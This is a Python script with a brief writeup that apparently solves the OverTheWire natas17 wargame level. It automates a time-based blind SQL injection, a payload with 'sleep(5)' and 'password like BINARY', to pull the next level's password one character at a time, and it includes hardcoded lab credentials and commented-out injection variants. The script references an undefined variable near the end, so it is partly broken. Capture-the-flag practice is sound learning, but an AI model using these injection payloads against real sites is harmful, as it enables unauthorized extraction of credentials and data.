#! /usr/bin/python3
import time
import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path=''

#Custom Headers
custom_headers=''
success='0.6'
#Payload

# user='admin" or 1=1 -- ##'

# user=f'fake" or (select(if((select substring(username,1,1 = "n")),true,sleep(5) ))) -- ##'
# user='na" or username like "%a%" and sleep(5) -- ##'

url=host+path


lower='abcdefghijklmnopqrstuvwxyz'
chars='aenrstuAENRSTU1238'
chars=lower+lower.upper()+'1234567890'

print(f'All chars are {chars}')

print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
# cleanheaders(headers)

final="xvKIqDjy4OPv7wCRgDlmj0pFs"
index=0
while (len(final) < 40):
	letter=final+chars[index]
	# user=f'fakeuser" or username like "%{letter}%" and sleep(3) -- ##'
	user=f'fakeuser" or password like BINARY "{letter}%" and sleep(5) -- ##'
	payload={"username":user,"debug":"true"}
	start=time.time()
	session=requests.Session()
	response=requests.post(url,data=payload,auth=(basic_username,basic_password))
	end=time.time()
	timetaken=(end-start)
	print(f'[-] Trying {letter}\t\t{timetaken}\tfound : {final}')

	#IGNORE THE CHARACTER
	if ((timetaken) < (4.9)):
		#Moving to the next character
		index=index+1

	#ADD THE CHAR AND RESET
	else:
		print(f'\t[+] Possible char {chars[index]} found:{final}')
		#Adding to the final password
		final+=chars[index]
		#Resetting the counter
		index=0


flag=content
print(flag)



print(f'Took {timetaken}')




#WRITEUP
#This time we get a form that allows us to enter a username to check for in the database
#However,it shows nothing for a correct username and false username
#This means that this is blind injection
#First we check for the sleep functionality the payload below
#fakuesr" or username like %as% and sleep(5) -- ##
#Running the script gives natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP